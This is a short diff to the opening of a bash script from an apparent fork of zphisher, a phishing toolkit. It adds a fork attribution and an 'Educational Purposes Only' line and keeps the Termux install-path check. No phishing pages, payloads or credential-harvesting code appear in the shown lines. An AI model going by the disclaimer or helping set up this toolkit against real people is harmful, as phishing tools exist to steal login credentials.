@@ -1,6 +1,7 @@
 #!/bin/bash
 
-# https://github.com/htr-tech/zphisher
+# Fork by Muhammad Taezeem - Educational Purposes Only
+# Original: https://github.com/htr-tech/zphisher
 
 if [[ $(uname -o) == *'Android'* ]];then
 	ZPHISHER_ROOT="/data/data/com.termux/files/usr/opt/zphisher"
